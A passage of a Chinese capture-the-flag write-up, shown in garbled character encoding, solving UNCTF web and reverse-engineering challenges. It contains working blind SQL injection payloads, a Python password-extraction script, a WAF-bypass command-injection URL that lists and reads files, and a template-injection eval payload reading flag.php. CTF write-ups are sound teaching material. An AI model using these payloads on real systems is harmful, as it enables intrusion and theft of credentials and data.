payloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">"admin' and ascii(substr((<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">distinct</span> database_name)<span class="keyword">from</span> mysql.innodb_index_stats),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">30</span><span class="comment">###vanish"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"admin' and ascii(substr((select group_concat(distinct table_name)from mysql.innodb_index_stats),1,1))=30###vanish"</span></span><br></pre></td></tr></table></figure><p>ç„¶åå†™ä¸€ä¸ªè‡ªåŠ¨åŒ–è„šæœ¬ã€‚ä¸æ–­åœ°æ³¨å†Œï¼Œç™»å½•ï¼Œæ”¹å¯†ç ï¼Œç„¶åæ ¹æ®å›æ˜¾æŒ‰ä½çˆ†ç ´åº“ã€è¡¨å³å¯</p><p>æœ€ç»ˆçš„payloadï¼šâ€adminâ€™ and ascii(substr((select * from fl4g),%d,1))=%d###vanishâ€%(i,j)</p><p><a href="https://p1.ssl.qhimg.com/t0140ff12ae8dcf0041.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t0140ff12ae8dcf0041.png" alt="img"></a></p><p>å¾—åˆ°flagï¼šUNCTF{585ae8df50433972bb6ebd76e3ebd9f4}ï¼ˆä¸çŸ¥é“ä¸ºå•¥ï¼Œå¼€å¤´æœ‰æ—¶å€™ä¼šç¼ºï¼‰</p><h3 id="NSB-Reset-Password"><a href="#NSB-Reset-Password" class="headerlink" title="NSB Reset Password"></a>NSB Reset Password</h3><p>æ³¨å†Œ-&gt;æ”¹å¯†ç ï¼šå‘éªŒè¯ç -&gt;é‡ç½®å¯†ç </p><p>ä¸‰ä¸ªåŒ…æŠ“è¿‡æ¥ï¼Œå‘ç°sessionIDéƒ½æ²¡æœ‰å˜åŠ¨è¿‡ã€‚</p><p>è¯•ç€çŒœæƒ³è¿™ä¸ªæ”¹å¯†ç çš„é€»è¾‘ï¼šå½“æˆ‘ç»™è‡ªå·±çš„è´¦æˆ·å‘é‚®ä»¶ï¼Œç„¶åè¾“å…¥éªŒè¯ç ï¼ŒéªŒè¯é€šè¿‡åï¼Œè¿™ä¸ªsessionIDå°±è·å¾—äº†æ›´æ”¹å¯†ç çš„æƒåˆ©ï¼Œä½†æ˜¯æ˜¯æ›´æ”¹è°çš„å¯†ç å‘¢ï¼Ÿè´¦æˆ·çš„ä¿¡æ¯æƒ³å¿…æ˜¯å­˜åœ¨sessionIDé‡Œçš„ã€‚</p><p>ä½†ç»è¿‡æµ‹éªŒï¼Œæ— è®ºæ˜¯ç»™adminå‘é‚®ä»¶ï¼Œè¿˜æ˜¯ç»™è‡ªå·±å‘é‚®ä»¶ï¼ŒsessionIDéƒ½æ²¡æœ‰å˜è¿‡ã€‚é‚£ä¹ˆï¼Œæ˜¾ç„¶sessionIDé‡Œçš„å‚¨å­˜çš„è´¦æˆ·ä¿¡æ¯çš„é‚£éƒ¨åˆ†æ˜¯å¯ä»¥è¢«è¦†ç›–çš„ï¼Œæ‰€ä»¥è§£é¢˜æµç¨‹ï¼š</p><p>å…ˆæ³¨å†Œ-&gt;æ›´æ”¹å¯†ç ï¼šå‘é€éªŒè¯ç -&gt;åˆ°é‡ç½®å¯†ç çš„ç•Œé¢ï¼Œæ­¤æ—¶å†å¼€ä¸€ä¸ªçª—å£ï¼Œå‘é€æ›´æ”¹adminå¯†ç çš„é‚®ä»¶ï¼ˆsessionIDé‡Œçš„ç”¨æˆ·è¢«è¦†ç›–ä¸ºadminï¼‰ï¼Œç„¶ååˆå›å»ï¼Œæ›´æ”¹å¯†ç ï¼ˆæ­¤æ—¶æ›´æ”¹çš„å°±æ˜¯sessionIDé‡Œçš„è´¦æˆ·ï¼Œå³adminçš„å¯†ç ï¼‰ï¼Œç„¶åç”¨è‡ªå·±æ›´æ”¹çš„å¯†ç ç™»å½•adminè´¦æˆ·å³å¯è·flag</p><p><a href="https://p5.ssl.qhimg.com/t01ba8c30adb43d2d38.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01ba8c30adb43d2d38.png" alt="img"></a></p><p>flagï¼šflag{175f3098f80735ddfdfbd4588f6b1082}</p><h3 id="easy-admin"><a href="#easy-admin" class="headerlink" title="easy_admin"></a>easy_admin</h3><p>å¾ˆå®¹æ˜“å‘ç°åœ¨/index.php?file=forgetè¿™é‡Œå­˜åœ¨æ³¨å…¥</p><p>fuzzåå‘ç°è¿‡æ»¤äº†and select whereã€‚ã€‚ã€‚</p><p>ç„¶åå¡äº†å¥½ä¹…ä¸çŸ¥é“æ€ä¹ˆæŸ¥adminçš„å¯†ç ï¼Œæœ€åç´¢æ€§ç›´æ¥ password ï¼ˆbugkuæœ‰ä¸€é“è¿‡æ»¤å¾ˆä¸¥çš„é¢˜å°±æ˜¯è¿™æ ·bypassï¼Œï¼‰</p><p>expï¼š</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://101.71.29.5:10045/index.php?file=forget"</span></span><br><span class="line"></span><br><span class="line">r = requests.Session()</span><br><span class="line"></span><br><span class="line">password=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="built_in">in</span> range(ord(<span class="string">'0'</span>),ord(<span class="string">'&#125;'</span>)):</span><br><span class="line">        <span class="keyword">data</span> = &#123;</span><br><span class="line">            <span class="string">"username"</span>:<span class="string">"-1'or ascii(substr((password),%d,1))=%d#"</span>%(i,j)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res = r.post(url, <span class="keyword">data</span>=<span class="keyword">data</span>)</span><br><span class="line">        #print res.<span class="keyword">text</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"ok reset password"</span> <span class="built_in">in</span> res.<span class="keyword">text</span>:</span><br><span class="line">            password = password + chr(j)</span><br><span class="line">            print password</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¯†ç ï¼š</p><p><a href="https://p1.ssl.qhimg.com/t01276c1041f642fd59.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t01276c1041f642fd59.png" alt="img"></a></p><p>ç™»å½•åyes you are admin, but you canâ€™ to get the flag, because admin will access the website from</p><p>from whereï¼Ÿ</p><p>ç›²çŒœæ˜¯127.0.0.1ï¼Œç„¶åå†æŠ¥æ–‡å¤´åŠ ä¸€ä¸ªRefererï¼Œå¾—åˆ°åä¸€åŠflag</p><p><a href="https://p4.ssl.qhimg.com/t01cf6314a828f8eeed.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t01cf6314a828f8eeed.png" alt="img"></a></p><p>flagï¼šflag{nevertoolatetox}</p><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>phpçš„æ­£åˆ™æœ‰ç‚¹å°æ¼æ´ï¼Œä¸¤ä¸ªæ–œæ ä¸¢è¿›phpåªå‰©ä¸€ä¸ªæ–œæ äº†ï¼Œç„¶åè¿™ä¸ªæ–œæ ä¸¢è¿›æ­£åˆ™å°±ç”¨æ¥è½¬ä¹‰äº†</p><p>è€Œè¿™ä¸€é¢˜ï¼Œå‡ºé¢˜äººä¼¼ä¹æ˜¯ç»™äº†ä¸ªhint</p><p><a href="https://p3.ssl.qhimg.com/t01b0ca65aa5a902b40.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01b0ca65aa5a902b40.png" alt="img"></a></p><p>è¿™é‡Œæ•…æ„æ¢äº†ä¸‹ä½ç½®ã€‚</p><p>æ‰€ä»¥è‡ªå·±åšäº†ä¸‹å®éªŒï¼Œå‘ç°ï¼Œç”±äºè¿™ä¸ªå°æ¼æ´ï¼Œaè¢«è¿‡æ»¤äº†|<em>è€Œä¸æ˜¯</em>ï¼Œbè¢«è¿‡æ»¤äº†|\nï¼Œè€Œä¸æ˜¯è¢«è¿‡æ»¤äº†\n</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//highlight_file(__FILE__);</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>['a'];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>['b'];</span><br><span class="line"><span class="comment">// try bypass it</span></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"</span>|,|;|\`|\\|\*|\<span class="keyword">n</span>|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\<span class="keyword">d</span>]|@|\||tail|bin|less|<span class="keyword">more</span>|string|<span class="keyword">nl</span>|<span class="keyword">pwd</span>|<span class="keyword">cat</span>|<span class="keyword">sh</span>|flag|find|<span class="keyword">ls</span>|grep|echo|w/is", <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="string">""</span>;</span><br><span class="line">    echo<span class="string">"waf-a\n"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"</span>|;|,|\`|\*|\\|\<span class="keyword">n</span>|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\<span class="keyword">d</span>]|@|\||tail|bin|less|<span class="keyword">more</span>|string|<span class="keyword">nl</span>|<span class="keyword">pwd</span>|<span class="keyword">cat</span>|<span class="keyword">sh</span>|flag|find|<span class="keyword">ls</span>|grep|echo|w/is", <span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="variable">$b</span>=<span class="string">""</span>;</span><br><span class="line">    echo<span class="string">"waf-b"</span>;&#125;</span><br><span class="line">echo <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">echo <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><p><a href="https://p4.ssl.qhimg.com/t010bbbade7d82cfd04.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t010bbbade7d82cfd04.png" alt="img"></a></p><p><a href="https://p2.ssl.qhimg.com/t0158c3f445ebc19a10.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t0158c3f445ebc19a10.png" alt="img"></a></p><p>åŒæ—¶ï¼Œa,bå°±éƒ½å¯ä»¥ç”¨æ–œæ äº†ï¼Œ</p><p>äºæ˜¯å°±å¯ä»¥é—­åˆå¼•å·åä»»æ„å‘½ä»¤æ‰§è¡Œ</p><p>å¯¹äºå‘½ä»¤çš„è¿‡æ»¤æœ‰ä¸¤ç§ç»•è¿‡æ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯linuxä¸‹ï¼Œç”¨é€šé…ç¬¦?ç»•è¿‡ï¼Œæ¯”å¦‚varå†™æˆv?r</p><p>è§£é¢˜ï¼š</p><ol><li><p><a href="http://101.71.29.5:10054/?a=\&amp;b=%0al\s%20/%0a" target="_blank" rel="noopener">http://101.71.29.5:10054/?a=\&amp;b=%0al\s%20/%0a</a></p></li><li><p>flagä¸åœ¨æ ¹ç›®å½•ä¸‹ï¼Œé‚£å°±æ‰¾æ‰¾ï¼Œ</p></li></ol><ul><li><a href="http://101.71.29.5:10054/?a=\&amp;b=%0afin\d%20/va?/???/htm?/%0a" target="_blank" rel="noopener">http://101.71.29.5:10054/?a=\&amp;b=%0afin\d%20/va?/???/htm?/%0a</a></li></ul><ol><li>æ‰¾åˆ°äº†</li></ol><ul><li><a href="http://101.71.29.5:10054/?a=\&amp;b=%0aca\t%20/va?/???/htm?/.F1jh_/h3R3_1S_your_F1A9.txt%0a" target="_blank" rel="noopener">http://101.71.29.5:10054/?a=\&amp;b=%0aca\t%20/va?/???/htm?/.F1jh_/h3R3_1S_your_F1A9.txt%0a</a></li></ul><p><a href="https://p4.ssl.qhimg.com/t011ea19b8dc163f851.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t011ea19b8dc163f851.png" alt="img"></a></p><p>flagï¼šunctf{86dfe85d7c5842c5c04adae104193ee1}</p><h3 id="å®¡è®¡ä¸€ä¸‹ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€å§"><a href="#å®¡è®¡ä¸€ä¸‹ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€å§" class="headerlink" title="å®¡è®¡ä¸€ä¸‹ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€å§"></a>å®¡è®¡ä¸€ä¸‹ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€å§</h3><p>å…ˆä¸¢è¿›Seay</p><p><a href="https://p5.ssl.qhimg.com/t01750cb1862de2f113.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01750cb1862de2f113.png" alt="img"></a></p><p>parse_template.phpä¸­æœ‰ä¸€ä¸ªeval</p><p>æŸ¥ä¸€ä¸‹è°ƒç”¨å…³ç³»ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">index.phpï¼šparse_again($searchword);</span><br><span class="line"></span><br><span class="line">parse_template.php:</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parse_again</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $template_html,$searchword;</span><br><span class="line">    $searchnum    = <span class="keyword">isset</span>($GLOBALS[<span class="string">'searchnum'</span>])?$GLOBALS[<span class="string">'searchnum'</span>]:<span class="string">""</span>;</span><br><span class="line">    $type      = <span class="keyword">isset</span>($GLOBALS[<span class="string">'type'</span>])?$GLOBALS[<span class="string">'type'</span>]:<span class="string">""</span>;</span><br><span class="line">    $typename = <span class="keyword">isset</span>($GLOBALS[<span class="string">'typename'</span>])?$GLOBALS[<span class="string">'typename'</span>]:<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $searchword = substr(RemoveXSS($searchword),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">    $searchnum = substr(RemoveXSS($searchnum),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">    $type = substr(RemoveXSS($type),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">    $typename = substr(RemoveXSS($typename),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">    $template_html = str_replace(<span class="string">"&#123;haha:searchword&#125;"</span>,$searchword,$template_html);</span><br><span class="line">    $template_html = str_replace(<span class="string">"&#123;haha:searchnum&#125;"</span>,$searchnum,$template_html);</span><br><span class="line">    $template_html = str_replace(<span class="string">"&#123;haha:type&#125;"</span>,$type,$template_html);</span><br><span class="line">    $template_html = str_replace(<span class="string">"&#123;haha:typename&#125;"</span>,$typename,$template_html);</span><br><span class="line">    $template_html = parseIf($template_html);</span><br><span class="line">    <span class="keyword">return</span> $template_html;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseIf</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos($content,<span class="string">'&#123;if:'</span>)=== <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $Rule = <span class="string">"/&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;/is"</span>;</span><br><span class="line">        preg_match_all($Rule,$content,$iar);</span><br><span class="line">        $arlen=count($iar[<span class="number">0</span>]);</span><br><span class="line">        $elseIfFlag=<span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">for</span>($m=<span class="number">0</span>;$m&lt;$arlen;$m++)&#123;</span><br><span class="line">            $strIf=$iar[<span class="number">1</span>][$m];</span><br><span class="line">            $strIf=parseStrIf($strIf);</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">"if("</span>.$strIf.<span class="string">") &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br></pre></td></tr></table></figure><p>ç„¶åçœ‹åˆ°template.htmlï¼Œæœç´¢searchwordå’Œsearchnum</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-film sea-text"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span></span><span class="template-variable">&#123;haha:searchword&#125;</span><span class="xml"> <span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">small</span>&gt;</span>å…±æœ‰<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sea-text"</span>&gt;</span></span><span class="template-variable">&#123;haha:searchnum&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span>ä¸ªå½±ç‰‡ ç¬¬<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sea-text"</span>&gt;</span></span><span class="template-variable">&#123;searchlist:page&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span>é¡µ<span class="tag">&lt;/<span class="name">small</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>æœ€åå†çœ‹çœ‹RemoveXSS</p><p>å‘ç° if:,</p><p>è§£é¢˜æ€è·¯ï¼š</p><p>é¦–å…ˆåˆ©ç”¨å››æ¬¡çš„strreplaceç»•è¿‡RemoveXss,æ§åˆ¶$templatehtml</p><p>ç„¶åæ˜¯ç»•è¿‡åˆ¤æ–­å’Œæ­£åˆ™ï¼š{if:å¼€å¤´ã€{end if}ç»“å°¾ï¼Œç„¶åçœŸæ­£æ‰§è¡Œçš„å‘½ä»¤è¦åœ¨ruleåŒ¹é…åˆ°çš„ç¬¬ä¸€ä¸ªï¼ˆ.*?ï¼‰</p><p>ç ´é¢˜ï¼š</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$searchnum=&#123;end <span class="keyword">if</span>&#125;</span><br><span class="line"></span><br><span class="line">$searchword=&#123;<span class="keyword">if</span>&#123;haha:<span class="keyword">type</span>&#125;</span><br><span class="line"></span><br><span class="line">$<span class="keyword">type</span>=:read&#123;haha:typename&#125;</span><br><span class="line"></span><br><span class="line">$typename=file(%27flag.php%27)&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·contentè¢«æ›¿æ¢ä¸º</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-film sea-text"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span></span><span class="template-variable">&#123;<span class="keyword">if</span>:readfile(%27flag.php%27)&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">small</span>&gt;</span>å…±æœ‰<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sea-text"</span>&gt;</span></span><span class="template-variable">&#123;end <span class="keyword">if</span>&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span>ä¸ªå½±ç‰‡ ç¬¬<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sea-text"</span>&gt;</span></span><span class="template-variable">&#123;searchlist:page&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span>é¡µ<span class="tag">&lt;/<span class="name">small</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>æ­£åˆ™è¿‡å$iarä¸º</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [<span class="meta">0</span>] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [<span class="meta">0</span>] =&gt; &#123;<span class="keyword">if</span>:readfile(%<span class="number">27f</span>lag.php%<span class="number">27</span>)&#125;&lt;/a&gt; &lt;small&gt;å…±æœ‰&lt;span <span class="keyword">class</span>=<span class="string">"sea-text"</span>&gt;&#123;end <span class="keyword">if</span>&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="meta">1</span>] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [<span class="meta">0</span>] =&gt; readfile(%<span class="number">27f</span>lag.php%<span class="number">27</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="meta">2</span>] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [<span class="meta">0</span>] =&gt; &lt;/a&gt; &lt;small&gt;å…±æœ‰&lt;span <span class="keyword">class</span>=<span class="string">"sea-text"</span>&gt;</span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>ç„¶å$strIfè¢«èµ‹å€¼ä¸ºreadfile(%27flag.php%27)</p><p>ç„¶å @eval(â€œif(readfile(%27flag.php%27)) { $ifFlag=true;} else{ $ifFlag=false;}â€);</p><p>readlfileè¾“å‡ºflag</p><p>æœ€ç»ˆpayloadï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchnum=&#123;end <span class="keyword">if</span>&#125;&amp;content=<span class="symbol">&lt;search&gt;</span>&#123;<span class="keyword">if</span>&#123;hah<span class="variable">a:type</span>&#125;&lt;/<span class="built_in">search</span>&gt;&amp;<span class="built_in">type</span>=:<span class="keyword">read</span>&#123;hah<span class="variable">a:typename</span>&#125;&amp;typename=<span class="keyword">file</span>(%<span class="number">27</span>flag.php%<span class="number">27</span>)&#125;</span><br></pre></td></tr></table></figure><p><a href="https://p2.ssl.qhimg.com/t01a43546f5bc598ac5.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t01a43546f5bc598ac5.png" alt="img"></a></p><p>flagï¼šUNCTF{5ee25610af306b625b4cadb4cb5fa24b}</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="666"><a href="#666" class="headerlink" title="666"></a>666</h3><p>é€†å‘ç­¾åˆ°é¢˜ï¼Œ</p><p>ä¸»è¦å‡½æ•°</p><p><a href="https://p0.ssl.qhimg.com/t01acfae537b2029f57.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>ç„¶åæ‰¾åˆ°ä¸€äº›å…³é”®å€¼ï¼Œå†æ ¹æ®åŠ å¯†é€»è¾‘å†™è§£å¯†è„šæœ¬å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">expï¼š</span><br><span class="line"></span><br><span class="line">cipher=<span class="string">'''izwhroz""w"v.K".Ni'''</span></span><br><span class="line">key=<span class="number">0x12</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(cipher),<span class="number">3</span>):</span><br><span class="line">    flag+=chr((ord(cipher[i])^key)<span class="number">-6</span>)</span><br><span class="line">    flag+=chr((ord(cipher[i+<span class="number">1</span>])^key)+<span class="number">6</span>)</span><br><span class="line">    flag+=chr((ord(cipher[i+<span class="number">2</span>])^key)^<span class="number">6</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼šunctf{b666b666b}</p><h3 id="ç¥å¥‡çš„æ•°ç»„"><a href="#ç¥å¥‡çš„æ•°ç»„" class="headerlink" title="ç¥å¥‡çš„æ•°ç»„"></a>ç¥å¥‡çš„æ•°ç»„</h3><p><a href="https://p5.ssl.qhimg.com/t01b1b5242af8d6740b.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>æ‰“å¼€ä¸»å‡½æ•°ï¼Œè¯»ä¸€ä¸‹ç¨‹åºé€»è¾‘ï¼Œç»“åˆå¤§å°ç«¯å­˜å‚¨é¡ºåºã€‚å¥½çš„ï¼Œflagå°±æ˜¯checkboxé‡Œç…§æŠ„ã€‚</p><p><a href="https://p2.ssl.qhimg.com/t01ea30e449f32cf1a9.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>flagï¼šad461e203c7975b35e527960cbfeb06c</p><h3 id="BabyXor"><a href="#BabyXor" class="headerlink" title="BabyXor"></a>BabyXor</h3><p>æ‰‹åŠ¨è„±å£³+åŠ¨è°ƒï¼Œç›´æ¥å‡ºflag23333</p><p><a href="https://p1.ssl.qhimg.com/t01243cb805fa8ffd23.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p><a href="https://p2.ssl.qhimg.com/t01e0f7ec207dfc09cb.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p><a href="https://p1.ssl.qhimg.com/t01f7bcda3fa207272c.png" target="_blank" rel="noopener"><img 